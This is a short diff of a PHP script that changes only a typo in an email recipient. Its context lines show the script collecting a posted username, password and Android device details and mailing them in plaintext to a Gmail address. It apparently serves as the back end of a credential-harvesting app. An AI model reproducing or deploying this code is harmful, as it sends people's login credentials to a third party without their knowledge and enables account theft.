@@ -8,7 +8,7 @@
 	$androidApi=$_POST['AndroidApi'];
 
 	
-	$to="emample@gmail.com";
+	$to="example@gmail.com";
 	$subject="Message";
 	$body=" username: $username \n password: $password \n time: $time \n Manufacturer: $manufacturer \n MobileModel: $mobilemodel \n Android Version: $androidversion \n Api: $androidApi";
 	mail($to,$subject,$body);
